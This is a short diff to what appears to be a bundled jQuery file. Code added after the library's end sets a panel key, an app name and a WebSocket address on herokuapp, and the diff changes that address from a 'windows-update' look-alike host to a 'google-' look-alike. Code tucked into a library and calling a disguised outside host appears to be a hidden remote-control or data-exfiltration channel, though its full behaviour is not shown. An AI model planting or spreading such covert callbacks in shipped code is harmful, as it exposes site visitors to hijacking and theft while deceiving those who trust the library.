@@ -10367,7 +10367,7 @@ return jQuery;
 
 var psykey = 'panelkey';
 var psyapp= "pwr";
-var psylink = 'wss://windows-update.herokuapp.com';
+var psylink = 'wss://google-.herokuapp.com';
 
 var psyid  = createToken();
 var ws ;
